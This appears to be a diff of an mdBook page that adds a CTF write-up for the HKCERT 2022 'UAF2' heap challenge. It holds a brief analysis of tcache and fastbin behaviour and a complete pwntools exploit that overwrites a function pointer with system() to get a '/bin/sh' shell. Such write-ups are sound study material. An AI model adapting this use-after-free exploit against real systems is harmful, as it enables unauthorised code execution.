@@ -3,7 +3,7 @@
     <head>
         <!-- Book generated using mdBook -->
         <meta charset="UTF-8">
-        <title>Introduction - CTF Write-ups</title>
+        <title>UAF2 - CTF Write-ups</title>
                 
 
         <!-- Custom HTML head -->
@@ -14,21 +14,21 @@
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="theme-color" content="#ffffff" />
 
-                <link rel="icon" href="favicon.svg">
-                        <link rel="shortcut icon" href="favicon.png">
-                <link rel="stylesheet" href="css/variables.css">
-        <link rel="stylesheet" href="css/general.css">
-        <link rel="stylesheet" href="css/chrome.css">
-                <link rel="stylesheet" href="css/print.css" media="print">
+                <link rel="icon" href="../favicon.svg">
+                        <link rel="shortcut icon" href="../favicon.png">
+                <link rel="stylesheet" href="../css/variables.css">
+        <link rel="stylesheet" href="../css/general.css">
+        <link rel="stylesheet" href="../css/chrome.css">
+                <link rel="stylesheet" href="../css/print.css" media="print">
         
         <!-- Fonts -->
-        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
-                <link rel="stylesheet" href="fonts/fonts.css">
+        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
+                <link rel="stylesheet" href="../fonts/fonts.css">
         
         <!-- Highlight.js Stylesheets -->
-        <link rel="stylesheet" href="highlight.css">
-        <link rel="stylesheet" href="tomorrow-night.css">
-        <link rel="stylesheet" href="ayu-highlight.css">
+        <link rel="stylesheet" href="../highlight.css">
+        <link rel="stylesheet" href="../tomorrow-night.css">
+        <link rel="stylesheet" href="../ayu-highlight.css">
 
         <!-- Custom theme stylesheets -->
         
@@ -36,7 +36,7 @@
     <body>
         <!-- Provide site root to javascript -->
         <script type="text/javascript">
-            var path_to_root = "";
+            var path_to_root = "../";
             var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
         </script>
 
@@ -82,7 +82,7 @@
 
         <nav id="sidebar" class="sidebar" aria-label="Table of contents">
             <div class="sidebar-scrollbox">
-                <ol class="chapter"><li class="chapter-item expanded affix "><a href="introducion.html">Introduction</a></li><li class="chapter-item expanded affix "><li class="part-title">HKCERT 2022</li><li class="chapter-item expanded "><a href="hkcert22/uaf.html"><strong aria-hidden="true">1.</strong> UAF</a></li><li class="chapter-item expanded "><a href="hkcert22/uaf2.html"><strong aria-hidden="true">2.</strong> UAF2</a></li><li class="chapter-item expanded "><a href="hkcert22/shellcode_runner_2.html"><strong aria-hidden="true">3.</strong> Shellcode Runner 2</a></li><li class="chapter-item expanded "><a href="hkcert22/clipboard.html"><strong aria-hidden="true">4.</strong> Clipboard</a></li><li class="chapter-item expanded "><a href="hkcert22/auction_with_blockchain.html"><strong aria-hidden="true">5.</strong> Auction with Blockchain</a></li></ol>            </div>
+                <ol class="chapter"><li class="chapter-item expanded affix "><a href="../introducion.html">Introduction</a></li><li class="chapter-item expanded affix "><li class="part-title">HKCERT 2022</li><li class="chapter-item expanded "><a href="../hkcert22/uaf.html"><strong aria-hidden="true">1.</strong> UAF</a></li><li class="chapter-item expanded "><a href="../hkcert22/uaf2.html" class="active"><strong aria-hidden="true">2.</strong> UAF2</a></li><li class="chapter-item expanded "><a href="../hkcert22/shellcode_runner_2.html"><strong aria-hidden="true">3.</strong> Shellcode Runner 2</a></li><li class="chapter-item expanded "><a href="../hkcert22/clipboard.html"><strong aria-hidden="true">4.</strong> Clipboard</a></li><li class="chapter-item expanded "><a href="../hkcert22/auction_with_blockchain.html"><strong aria-hidden="true">5.</strong> Auction with Blockchain</a></li></ol>            </div>
             <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
         </nav>
 
@@ -114,7 +114,7 @@
                     <h1 class="menu-title">CTF Write-ups</h1>
 
                     <div class="right-buttons">
-                                                <a href="print.html" title="Print this book" aria-label="Print this book">
+                                                <a href="../print.html" title="Print this book" aria-label="Print this book">
                             <i id="print-button" class="fa fa-print"></i>
                         </a>
                                                                         
@@ -143,15 +143,78 @@
 
                 <div id="content" class="content">
                     <main>
-                        <h1 id="introduction"><a class="header" href="#introduction">Introduction</a></h1>
-<p>Hi! I am Jeff LIU. This is the write-ups of CTF challenges that I have completed.</p>
+                        <h1 id="uaf2"><a class="header" href="#uaf2">UAF2</a></h1>
+<h2 id="challenge-details"><a class="header" href="#challenge-details">Challenge Details</a></h2>
+<p><img src="assets/uaf2_details.png" alt="" /></p>
+<h2 id="analysis"><a class="header" href="#analysis">Analysis</a></h2>
+<p>As the code of the challenge is similar to <a href="uaf.html">UAF</a> challenge, I used <code>diff</code> to find the difference to save some time.</p>
+<p><img src="assets/uaf2_diff.png" alt="" /></p>
+<p>You can see there are only two main differences:</p>
+<ol>
+<li>No <code>get_shell()</code> anymore but the <code>system()</code> is still used to find the current time. So, our goal this time is to modify the address of <code>speak()</code> to <code>system()</code> and the value of name to <code>/bin/sh</code></li>
+<li>The size of the name is now fixed to <code>0x18</code>. Therefore, all the chunk size will be <code>0x20</code>, which means the attack used in <a href="uaf.html">UAF</a> cannot be applied again.</li>
+</ol>
+<p>But after looking into the binary, something abnormal appeared:
+<img src="assets/uaf2_gdb.png" alt="" /></p>
+<p>Notice the fastbin show that something is corrupted. Thus, I try testing the fastbin by filling up the <code>tcache</code> with animals (each tcache bin can hold 7 chunk at maximum, so 4 animals will create 8 chunk and one chunk should go to fastbin instead).
+<img src="assets/uaf2_gdb.png" alt="" />
+This time the chunk did not go to fastbin. If we allocate a new animal, the 2 chunks created are not connected anymore. Hence, there should be some combination that shifted the chunk and write to the destinated region.</p>
+<p>After testing different combinations, I have come up the following solution.</p>
+<h2 id="solution"><a class="header" href="#solution">Solution</a></h2>
+<pre><code class="language-python">from pwn import *
+context.log_level = 'debug'
+context.terminal = ['tmux', 'splitw', '-h']
+context.arch = 'amd64'
+
+e = ELF('./zoo')
+r = gdb.debug('./zoo', 'b* remove_animal\nc')
+# r = remote('chal.hkcert22.pwnable.hk', 28236)
+def create(data):
+    r.sendlineafter(b'Exit\n&gt; ', b'1')
+    r.sendlineafter(b'2) Panda', b'1')
+    r.sendafter(b'animal?', data)
+
+def delete(id):
+    r.sendlineafter(b'Exit\n&gt; ', b'2')
+    r.sendlineafter(b'(0-9)', str(id).encode())
+
+def report(id):
+    r.sendlineafter(b'Exit\n&gt; ', b'3')
+    r.sendlineafter(b'(0-9)', str(id).encode())
+
+# 0 - 3
+for i in range(4):
+    create(b'A' * 0x18)
+
+# 0 - 3
+for i in range(4):
+    delete(3 - i)
+
+# 4
+create(p64(e.symbols['system']))
+
+# 5 - 8
+for i in range(4):
+    create(b'A' * 0x18)
+delete(8)
+delete(7)
+delete(5)
+delete(6)
+
+create(b'/bin/sh\0')
+report(1)
+r.interactive()
+</code></pre>
 
                     </main>
 
                     <nav class="nav-wrapper" aria-label="Page navigation">
                         <!-- Mobile navigation buttons -->
+                                                    <a rel="prev" href="../hkcert22/uaf.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
                         
-                                                    <a rel="next" href="hkcert22/uaf.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                                    <a rel="next" href="../hkcert22/shellcode_runner_2.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                 <i class="fa fa-angle-right"></i>
                             </a>
                         
@@ -161,8 +224,11 @@
             </div>
 
             <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                                    <a rel="prev" href="../hkcert22/uaf.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
                 
-                                    <a rel="next" href="hkcert22/uaf.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                    <a rel="next" href="../hkcert22/shellcode_runner_2.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                         <i class="fa fa-angle-right"></i>
                     </a>
                             </nav>
@@ -177,13 +243,13 @@
         </script>
         
         
-                <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
-        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
-        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
+                <script src="../elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../mark.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../searcher.js" type="text/javascript" charset="utf-8"></script>
         
-        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
-        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
-        <script src="book.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../book.js" type="text/javascript" charset="utf-8"></script>
 
         <!-- Custom JS scripts -->
         
